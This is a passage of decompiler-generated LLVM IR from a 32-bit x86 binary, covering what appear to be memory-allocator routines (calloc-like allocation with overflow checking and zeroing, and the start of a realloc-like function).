  store i32 %v1_80508f4, i32* %ecx.global-to-local, align 4
  %v10_80508f7 = icmp ult i32 %v1_80508f4, %v1_8050594
  br i1 %v10_80508f7, label %dec_label_pc_8050977, label %dec_label_pc_80508fd

dec_label_pc_80508fd:                             ; preds = %dec_label_pc_80508eb
  store i32 %.v1_8050280, i32* %esi.global-to-local, align 4
  %v2_8050903 = sub i32 %v1_80508f4, %.v1_8050280
  store i32 %v2_8050903, i32* %ecx.global-to-local, align 4
  %v2_8050905 = add i32 %v0_80508eb, %.v1_8050280
  store i32 %v2_8050905, i32* @edx, align 4
  %v1_8050908 = or i32 %.v1_8050280, 1
  store i32 %v1_8050908, i32* %eax.global-to-local, align 4
  store i32 %v2_8050905, i32* @global_var_8053c6c.33, align 4
  store i32 %v1_8050908, i32* %v2_80508f1, align 4
  %v0_8050914.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050914

dec_label_pc_8050914:                             ; preds = %dec_label_pc_80505a5, %dec_label_pc_80508fd
  %v0_8050914 = phi i32 [ %v5_80505b8, %dec_label_pc_80505a5 ], [ %v0_8050914.pre, %dec_label_pc_80508fd ]
  %v1_8050914 = or i32 %v0_8050914, 1
  store i32 %v1_8050914, i32* %ecx.global-to-local, align 4
  %v0_8050917 = load i32, i32* @ebx, align 4
  %v1_8050917 = add i32 %v0_8050917, 8
  store i32 %v1_8050917, i32* %ebx.global-to-local, align 4
  %v1_805091a = load i32, i32* @edx, align 4
  %v2_805091a = add i32 %v1_805091a, 4
  %v3_805091a = inttoptr i32 %v2_805091a to i32*
  store i32 %v1_8050914, i32* %v3_805091a, align 4
  br label %dec_label_pc_8050984

dec_label_pc_805091f:                             ; preds = %dec_label_pc_805035f
  %v5_8050925 = sub i32 %v1_8050342, %.v1_8050280
  store i32 %v5_8050925, i32* %eax.global-to-local, align 4
  %v2_8050929 = add i32 %v1_8050936, %.v1_8050280
  store i32 %v2_8050929, i32* @edx, align 4
  %v1_805092d = or i32 %.v1_8050280, 1
  store i32 %v2_8050929, i32* @global_var_8053c70.34, align 16
  store i32 %v1_805092d, i32* %v2_805033c, align 4
  %v0_8050939 = load i32, i32* %eax.global-to-local, align 4
  %v0_805093b = load i32, i32* @edx, align 4
  store i32 %v0_805093b, i32* @global_var_8053c7c.51, align 4
  %v1_8050941 = or i32 %v0_8050939, 1
  store i32 %v1_8050941, i32* %ecx.global-to-local, align 4
  store i32 %v0_805093b, i32* @global_var_8053c80.36, align 128
  %v1_805094a = add i32 %v0_805093b, 8
  %v2_805094a = inttoptr i32 %v1_805094a to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_805094a, align 4
  %v0_8050951 = load i32, i32* @edx, align 4
  %v1_8050951 = add i32 %v0_8050951, 12
  %v2_8050951 = inttoptr i32 %v1_8050951 to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_8050951, align 4
  %v0_8050958 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050958 = load i32, i32* @edx, align 4
  %v2_8050958 = add i32 %v1_8050958, 4
  %v3_8050958 = inttoptr i32 %v2_8050958 to i32*
  store i32 %v0_8050958, i32* %v3_8050958, align 4
  %v0_805095b = load i32, i32* %eax.global-to-local, align 4
  %v1_805095b = load i32, i32* @edx, align 4
  %v3_805095b = add i32 %v1_805095b, %v0_805095b
  %v4_805095b = inttoptr i32 %v3_805095b to i32*
  store i32 %v0_805095b, i32* %v4_805095b, align 4
  br label %dec_label_pc_8050969

dec_label_pc_8050960:                             ; preds = %dec_label_pc_805036e
  store i32 %.v1_8050280, i32* %ebx.global-to-local, align 4
  %v0_8050964 = load i32, i32* @ebp, align 4
  %v2_8050964 = or i32 %.v1_8050280, 4
  %v3_8050964 = add i32 %v0_8050964, %v2_8050964
  %v4_8050964 = inttoptr i32 %v3_8050964 to i32*
  %v5_8050964 = load i32, i32* %v4_8050964, align 4
  %v6_8050964 = or i32 %v5_8050964, 1
  store i32 %v6_8050964, i32* %v4_8050964, align 4
  br label %dec_label_pc_8050969

dec_label_pc_8050969:                             ; preds = %dec_label_pc_805091f, %dec_label_pc_8050960
  %v0_8050969 = load i32, i32* @ebp, align 4
  %v1_8050969 = add i32 %v0_8050969, 8
  store i32 %v1_8050969, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050984

dec_label_pc_805096e:                             ; preds = %dec_label_pc_805045e
  %v1_805096e = load i32, i32* @ebx, align 4
  %v2_805096e = add i32 %v0_805046d, 4
  %v3_805096e = add i32 %v2_805096e, %v1_805096e
  %v4_805096e = inttoptr i32 %v3_805096e to i32*
  %v5_805096e = load i32, i32* %v4_805096e, align 4
  %v6_805096e = or i32 %v5_805096e, 1
  store i32 %v6_805096e, i32* %v4_805096e, align 4
  br label %dec_label_pc_8050973

dec_label_pc_8050973:                             ; preds = %dec_label_pc_8050476, %dec_label_pc_805096e
  %v0_8050973 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050973, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050984

dec_label_pc_8050977:                             ; preds = %dec_label_pc_8050735, %dec_label_pc_80508eb, %dec_label_pc_805073f
  %v0_8050977 = load i32, i32* %stack_var_-92, align 4
  %v1_8050977 = call i32 @function_804fe1b(i32 %v0_8050977)
  store i32 %v1_8050977, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805097e = inttoptr i32 %v1_8050977 to i32*
  store i32 12, i32* %v1_805097e, align 4
  br label %dec_label_pc_8050984

dec_label_pc_8050984:                             ; preds = %dec_label_pc_8050973, %dec_label_pc_8050969, %dec_label_pc_8050914, %dec_label_pc_80505d0, %dec_label_pc_8050582, %dec_label_pc_8050309, %dec_label_pc_8050977
  store i32 %v2_8050240, i32* @eax, align 4
  store i32 %v2_8050240, i32* %stack_var_-92, align 4
  %v2_805098d = call i32 @function_8051757(i32 %v2_8050240, i32 1)
  store i32 %v2_805098d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050995

dec_label_pc_8050995:                             ; preds = %dec_label_pc_805025e, %dec_label_pc_8050984
  %v0_8050998 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050998, i32* %eax.global-to-local, align 4
  %v2_805099a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805099a, i32* %ebx.global-to-local, align 4
  store i32 %v0_805022d, i32* @esi, align 4
  store i32 %v0_805022c, i32* @edi, align 4
  store i32 %v0_805022b, i32* @ebp, align 4
  ret i32 %v0_8050998

; uselistorder directives
  uselistorder i32 %v0_805095b, { 1, 0 }
  uselistorder i32 %v0_805093b, { 1, 0, 2 }
  uselistorder i32 %v2_80508d8, { 1, 0, 2 }
  uselistorder i32 %v0_80508c6, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805085d, { 1, 0 }
  uselistorder i32 %v2_805084b, { 1, 0 }
  uselistorder i32 %v1_8050802, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80507ec, { 1, 0, 2 }
  uselistorder i32 %v2_80507e0, { 1, 2, 0 }
  uselistorder i32 %v2_80507db, { 1, 0, 2 }
  uselistorder i32 %v1_80507cb, { 2, 1, 0 }
  uselistorder i8 %v0_8050799, { 1, 0, 2 }
  uselistorder i1 %v10_8050782, { 1, 0 }
  uselistorder i32 %v2_805077c, { 1, 0, 2 }
  uselistorder i32 %v0_805083e100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_8050776, { 2, 1, 0 }
  uselistorder i32 %v8_805074c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8050749, { 1, 0 }
  uselistorder i32 %v0_8050728, { 1, 0 }
  uselistorder i32 %v2_80506f9, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80506f1, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80506de, { 1, 0 }
  uselistorder i1 %v2_80506d5, { 2, 1, 0 }
  uselistorder i32 %v1_80506d5, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_80506c2, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80506a6, { 1, 0, 2 }
  uselistorder i32 %v2_8050692, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805065b, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805064f, { 2, 1, 0 }
  uselistorder i32 %v8_805063e, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8050625, { 1, 0, 2 }
  uselistorder i32 %v0_80505c1, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8050594, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805058a, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805057c, { 1, 0 }
  uselistorder i32 %v1_8050513, { 1, 0 }
  uselistorder i32 %v3_8050507, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8050517, { 1, 0 }
  uselistorder i32 %v2_8050501, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80504fe7, { 1, 0 }
  uselistorder i32 %v2_80504f3, { 1, 0 }
  uselistorder i32 %v1_80504d7, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80504d3, { 2, 1, 0 }
  uselistorder i32 %v1_80504cf, { 1, 0 }
  uselistorder i32 %v1_80504c3, { 2, 1, 0 }
  uselistorder i32 %v2_80504b9, { 1, 0 }
  uselistorder i32 %v1_80504b6, { 1, 2, 0 }
  uselistorder i32 %v4_8050454, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_805049f, { 1, 0 }
  uselistorder i32 %v0_805046d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050440, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805040d, { 0, 2, 1 }
  uselistorder i32 %v2_80503f1, { 1, 0 }
  uselistorder i32 %v1_80503e7, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80503e2.lcssa, { 1, 0 }
  uselistorder i32 %v3_80503d2, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80503c9, { 1, 0, 2 }
  uselistorder i32 %v2_80503a5, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805038d, { 2, 1, 0 }
  uselistorder i32 %v0_8050379, { 2, 0, 3, 1 }
  uselistorder i32 %v3_805033f, { 1, 0, 2 }
  uselistorder i32 %v1_8050936, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805040d9, { 1, 0, 2 }
  uselistorder i32 %v3_80502ec, { 1, 0, 2 }
  uselistorder i32 %v2_80502de, { 2, 1, 0 }
  uselistorder i1 %v6_80502d8, { 1, 0, 2 }
  uselistorder i32 %v2_80502b9, { 2, 1, 0 }
  uselistorder i8 %v0_8050287, { 2, 1, 3, 0, 4 }
  uselistorder i32 %.v1_8050280, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_8050270, { 0, 2, 1 }
  uselistorder i32 %v0_8050259, { 1, 0 }
  uselistorder i32 %v2_8050240, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 1, 20, 2, 3, 4, 5, 6, 7, 8, 9, 24, 10, 25, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8053fa0.48, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8051a70, { 1, 0 }
  uselistorder i32 134560884, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8053c80.36, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8050205, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053c6c.33 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8053c6c.33 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8050995, { 1, 0 }
  uselistorder label %dec_label_pc_8050984, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050977, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050973, { 1, 0 }
  uselistorder label %dec_label_pc_8050969, { 1, 0 }
  uselistorder label %dec_label_pc_8050914, { 1, 0 }
  uselistorder label %dec_label_pc_80508eb, { 1, 0 }
  uselistorder label %dec_label_pc_80508d8, { 1, 0 }
  uselistorder label %dec_label_pc_80508c6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050858, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050853, { 1, 0 }
  uselistorder label %dec_label_pc_80507e0, { 1, 0 }
  uselistorder label %dec_label_pc_80507c9, { 1, 0 }
  uselistorder label %dec_label_pc_80507b2, { 1, 0 }
  uselistorder label %dec_label_pc_8050735, { 1, 0 }
  uselistorder label %dec_label_pc_8050728, { 1, 0 }
  uselistorder label %dec_label_pc_80506e9, { 1, 0 }
  uselistorder label %dec_label_pc_80506c2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80506a6, { 1, 0 }
  uselistorder label %dec_label_pc_805068d, { 1, 0 }
  uselistorder label %dec_label_pc_805066f, { 1, 0 }
  uselistorder label %dec_label_pc_805058a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050582, { 1, 0 }
  uselistorder label %dec_label_pc_805056b, { 1, 0 }
  uselistorder label %dec_label_pc_80504fe, { 1, 0 }
  uselistorder label %dec_label_pc_8050503.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80504d7, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805045e, { 1, 0 }
  uselistorder label %dec_label_pc_805040d, { 1, 0 }
  uselistorder label %dec_label_pc_80503e5, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80503ce, { 1, 0 }
  uselistorder label %dec_label_pc_805033c, { 1, 0 }
  uselistorder label %dec_label_pc_805040d.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050309, { 1, 0, 3, 2 }
}

define i32 @function_805099f(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805099f:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805099f = load i32, i32* @edi, align 4
  %v0_80509a1 = load i32, i32* @ebx, align 4
  %v12_80509a2 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80509a5 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_80509af = sdiv i64 %sext, 4294967296
  %v3_80509af = sext i32 %arg2 to i64
  %v4_80509af = mul nsw i64 %v3_80509af, %v2_80509af
  %v5_80509af = trunc i64 %v4_80509af to i32
  store i32 %v5_80509af, i32* @ebx, align 4
  %v2_80509b2 = icmp eq i32 %v4_80509a5, 0
  br i1 %v2_80509b2, label %dec_label_pc_80509d4, label %dec_label_pc_80509b6

dec_label_pc_80509b6:                             ; preds = %dec_label_pc_805099f
  store i32 %v4_80509a5, i32* @edi, align 4
  %div = udiv i32 %v5_80509af, %v4_80509a5
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_80509be = icmp eq i32 %div, %arg2
  br i1 %v12_80509be, label %dec_label_pc_80509d4, label %dec_label_pc_80509c2

dec_label_pc_80509c2:                             ; preds = %dec_label_pc_80509b6
  %v1_80509c2 = call i32 @function_804fe1b(i32 %v0_80509a1)
  store i32 %v1_80509c2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80509c9 = inttoptr i32 %v1_80509c2 to i32*
  store i32 12, i32* %v1_80509c9, align 4
  br label %dec_label_pc_8050a8a

dec_label_pc_80509d4:                             ; preds = %dec_label_pc_80509b6, %dec_label_pc_805099f
  store i32 %v12_80509a2, i32* @eax, align 4
  %v2_80509e4 = call i32 @function_8051757(i32 %v12_80509a2, i32 134551380)
  store i32 %v2_80509e4, i32* %eax.global-to-local, align 4
  %v1_80509f0 = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_805395c.31 to i32))
  store i32 %v1_80509f0, i32* %eax.global-to-local, align 4
  %v0_80509f5 = load i32, i32* @ebx, align 4
  %v1_80509f8 = call i32 @function_805022b(i32 %v0_80509f5)
  store i32 %v1_80509f8, i32* %eax.global-to-local, align 4
  store i32 %v1_80509f8, i32* %ebx.global-to-local, align 4
  %v1_8050a02 = icmp eq i32 %v1_80509f8, 0
  br i1 %v1_8050a02, label %dec_label_pc_8050a79, label %dec_label_pc_8050a06

dec_label_pc_8050a06:                             ; preds = %dec_label_pc_80509d4
  %v1_8050a06 = add i32 %v1_80509f8, -4
  %v2_8050a06 = inttoptr i32 %v1_8050a06 to i32*
  %v3_8050a06 = load i32, i32* %v2_8050a06, align 4
  store i32 %v3_8050a06, i32* %eax.global-to-local, align 4
  %v2_8050a09 = and i32 %v3_8050a06, 2
  %v3_8050a09 = icmp eq i32 %v2_8050a09, 0
  %v1_8050a0b = icmp eq i1 %v3_8050a09, false
  br i1 %v1_8050a0b, label %dec_label_pc_8050a79, label %dec_label_pc_8050a0d

dec_label_pc_8050a0d:                             ; preds = %dec_label_pc_8050a06
  %v1_8050a0d3 = add i32 %v3_8050a06, -4
  %v1_8050a10 = and i32 %v1_8050a0d3, -4
  %v2_8050a15 = udiv i32 %v1_8050a10, 4
  store i32 %v2_8050a15, i32* %eax.global-to-local, align 4
  %v5_8050a18 = icmp ult i32 %v1_8050a10, 36
  %tmp = and i32 %v1_8050a0d3, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8050a1b = or i1 %v5_8050a18, %tmp18
  br i1 %v2_8050a1b, label %dec_label_pc_8050a2c, label %dec_label_pc_8050a1d

dec_label_pc_8050a1d:                             ; preds = %dec_label_pc_8050a0d
  %v3_8050a22 = inttoptr i32 %v1_80509f8 to i8*
  %v4_8050a22 = call i32 @function_804fe6c(i8* %v3_8050a22, i32 0, i32 %v1_8050a10)
  store i32 %v4_8050a22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a79

dec_label_pc_8050a2c:                             ; preds = %dec_label_pc_8050a0d
  %v1_8050a2c = inttoptr i32 %v1_80509f8 to i32*
  store i32 0, i32* %v1_8050a2c, align 4
  %v0_8050a32 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a32 = add i32 %v0_8050a32, 4
  %v2_8050a32 = inttoptr i32 %v1_8050a32 to i32*
  store i32 0, i32* %v2_8050a32, align 4
  %v0_8050a39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a39 = add i32 %v0_8050a39, 8
  %v2_8050a39 = inttoptr i32 %v1_8050a39 to i32*
  store i32 0, i32* %v2_8050a39, align 4
  %v0_8050a40 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8050a40, 5
  br i1 %tmp15, label %dec_label_pc_8050a79, label %dec_label_pc_8050a45

dec_label_pc_8050a45:                             ; preds = %dec_label_pc_8050a2c
  %v0_8050a45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a45 = add i32 %v0_8050a45, 12
  %v2_8050a45 = inttoptr i32 %v1_8050a45 to i32*
  store i32 0, i32* %v2_8050a45, align 4
  %v0_8050a4c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a4c = add i32 %v0_8050a4c, 16
  %v2_8050a4c = inttoptr i32 %v1_8050a4c to i32*
  store i32 0, i32* %v2_8050a4c, align 4
  %v0_8050a53 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8050a53, 7
  br i1 %tmp16, label %dec_label_pc_8050a79, label %dec_label_pc_8050a58

dec_label_pc_8050a58:                             ; preds = %dec_label_pc_8050a45
  %v0_8050a58 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a58 = add i32 %v0_8050a58, 20
  %v2_8050a58 = inttoptr i32 %v1_8050a58 to i32*
  store i32 0, i32* %v2_8050a58, align 4
  %v0_8050a5f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a5f = add i32 %v0_8050a5f, 24
  %v2_8050a5f = inttoptr i32 %v1_8050a5f to i32*
  store i32 0, i32* %v2_8050a5f, align 4
  %v0_8050a66 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8050a66, 9
  br i1 %tmp17, label %dec_label_pc_8050a79, label %dec_label_pc_8050a6b

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a58
  %v0_8050a6b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a6b = add i32 %v0_8050a6b, 28
  %v2_8050a6b = inttoptr i32 %v1_8050a6b to i32*
  store i32 0, i32* %v2_8050a6b, align 4
  %v0_8050a72 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a72 = add i32 %v0_8050a72, 32
  %v2_8050a72 = inttoptr i32 %v1_8050a72 to i32*
  store i32 0, i32* %v2_8050a72, align 4
  br label %dec_label_pc_8050a79

dec_label_pc_8050a79:                             ; preds = %dec_label_pc_8050a58, %dec_label_pc_8050a45, %dec_label_pc_8050a2c, %dec_label_pc_8050a06, %dec_label_pc_80509d4, %dec_label_pc_8050a1d, %dec_label_pc_8050a6b
  store i32 %v12_80509a2, i32* @eax, align 4
  %v2_8050a82 = call i32 @function_8051757(i32 %v12_80509a2, i32 1)
  store i32 %v2_8050a82, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a8a

dec_label_pc_8050a8a:                             ; preds = %dec_label_pc_80509c2, %dec_label_pc_8050a79
  %v0_8050a8d = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050a8d, i32* %eax.global-to-local, align 4
  store i32 %v0_80509a1, i32* @ebx, align 4
  store i32 %v0_805099f, i32* @edi, align 4
  ret i32 %v0_8050a8d

; uselistorder directives
  uselistorder i32 %v1_8050a10, { 2, 1, 0 }
  uselistorder i32 %v1_80509f8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a8a, { 1, 0 }
  uselistorder label %dec_label_pc_8050a79, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8050a93(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050a93:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8050a96 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8050a9e = icmp eq i32* %arg1, null
  %v1_8050aa3 = icmp eq i1 %v4_8050a9e, false
  br i1 %v1_8050aa3, label %dec_label_pc_8050ab5, label %dec_label_pc_8050aa5

dec_label_pc_8050aa5:                             ; preds = %dec_label_pc_8050a93
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8050aa9 = call i32 @function_805022b(i32 %arg2)
  store i32 %v1_8050aa9, i32* %eax.global-to-local, align 4
  store i32 %v1_8050aa9, i32* @ebx, align 4
  br label %dec_label_pc_8050dae

dec_label_pc_8050ab5:                             ; preds = %dec_label_pc_8050a93
  %v1_8050ab5 = icmp eq i32 %arg2, 0
  %v1_8050ab7 = icmp eq i1 %v1_8050ab5, false
  br i1 %v1_8050ab7, label %dec_label_pc_8050aca, label %dec_label_pc_8050ab9

dec_label_pc_8050ab9:                             ; preds = %dec_label_pc_8050ab5
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050ac0 = call i32 @function_8050ff0(i32 %tmp7)
  store i32 %v1_8050ac0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050dae

dec_label_pc_8050aca:                             ; preds = %dec_label_pc_8050ab5
  %v2_8050ad5 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050ad5, i32* @eax, align 4
  store i32 %v2_8050ad5, i32* %stack_var_-60, align 4
  %v2_8050ada = call i32 @function_8051757(i32 %v2_8050ad5, i32 134551380)
  store i32 %v2_8050ada, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805395c.31 to i32), i32* %stack_var_-60, align 4
  %v1_8050ae6 = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_805395c.31 to i32))
  store i32 %v1_8050ae6, i32* %eax.global-to-local, align 4
  %v0_8050aee = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050aee, -32
  br i1 %tmp21, label %dec_label_pc_8050b05, label %dec_label_pc_8050af3

dec_label_pc_8050af3:                             ; preds = %dec_label_pc_8050aca
  %v0_8050af3 = load i32, i32* %stack_var_-60, align 4
  %v1_8050af3 = call i32 @function_804fe1b(i32 %v0_8050af3)
  store i32 %v1_8050af3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050afa = inttoptr i32 %v1_8050af3 to i32*
  store i32 12, i32* %v1_8050afa, align 4
  br label %dec_label_pc_8050db1

dec_label_pc_8050b05:                             ; preds = %dec_label_pc_8050aca
  %v1_8050b05 = add i32 %v0_8050aee, 11
  %tmp22 = icmp ult i32 %v1_8050b05, 16
  %v1_8050b15 = and i32 %v1_8050b05, -8
  %v1_8050b05.v1_8050b15 = select i1 %tmp22, i32 %v1_8050b05, i32 %v1_8050b15
  %.v1_8050b15 = select i1 %tmp22, i32 16, i32 %v1_8050b15
  store i32 %v1_8050b05.v1_8050b15, i32* %eax.global-to-local, align 4
  %v1_8050b20 = add i32 %tmp7, -8
  store i32 %v1_8050b20, i32* @edi, align 4
  %v1_8050b23 = add i32 %tmp7, -4
  %v2_8050b23 = inttoptr i32 %v1_8050b23 to i32*
  %v3_8050b23 = load i32, i32* %v2_8050b23, align 4
  store i32 %v3_8050b23, i32* %edx.global-to-local, align 4
  %v1_8050b28 = and i32 %v3_8050b23, -4
  store i32 %v1_8050b28, i32* %eax.global-to-local, align 4
  %v2_8050b2f = and i32 %v3_8050b23, 2
  %v3_8050b2f = icmp eq i32 %v2_8050b2f, 0
  %v1_8050b32 = icmp eq i1 %v3_8050b2f, false
  br i1 %v1_8050b32, label %dec_label_pc_8050ccc, label %dec_label_pc_8050b38

dec_label_pc_8050b38:                             ; preds = %dec_label_pc_8050b05
  store i32 %.v1_8050b15, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050b28, i32* @ebx, align 4
  %v7_8050b3e = icmp ult i32 %v1_8050b28, %.v1_8050b15
  %v1_8050b40 = icmp eq i1 %v7_8050b3e, false
  br i1 %v1_8050b40, label %dec_label_pc_8050c77, label %dec_label_pc_8050b46

dec_label_pc_8050b46:                             ; preds = %dec_label_pc_8050b38
  %v2_8050b46 = add i32 %v1_8050b28, %v1_8050b20
  store i32 %v2_8050b46, i32* @esi, align 4
  %v1_8050b49 = load i32, i32* @global_var_8053c6c.33, align 4
  %v12_8050b49 = icmp eq i32 %v2_8050b46, %v1_8050b49
  %v1_8050b4f = icmp eq i1 %v12_8050b49, false
  %v1_8050b89 = add i32 %v2_8050b46, 4
  %v2_8050b89 = inttoptr i32 %v1_8050b89 to i32*
  %v3_8050b89 = load i32, i32* %v2_8050b89, align 4
  br i1 %v1_8050b4f, label %dec_label_pc_8050b89, label %dec_label_pc_8050b51

dec_label_pc_8050b51:                             ; preds = %dec_label_pc_8050b46
  %v1_8050b56 = and i32 %v3_8050b89, -4
  %v2_8050b59 = add i32 %v1_8050b56, %v1_8050b28
  store i32 %v2_8050b59, i32* %ecx.global-to-local, align 4
  %v1_8050b5f = add i32 %.v1_8050b15, 16
  store i32 %v1_8050b5f, i32* %eax.global-to-local, align 4
  %v7_8050b62 = icmp ult i32 %v2_8050b59, %v1_8050b5f
  br i1 %v7_8050b62, label %dec_label_pc_8050bc7, label %dec_label_pc_8050b66

dec_label_pc_8050b66:                             ; preds = %dec_label_pc_8050b51
  %v1_8050b66 = urem i32 %v3_8050b23, 2
  %v5_8050b69 = or i32 %v1_8050b66, %.v1_8050b15
  store i32 %v5_8050b69, i32* %edx.global-to-local, align 4
  store i32 %v5_8050b69, i32* %v2_8050b23, align 4
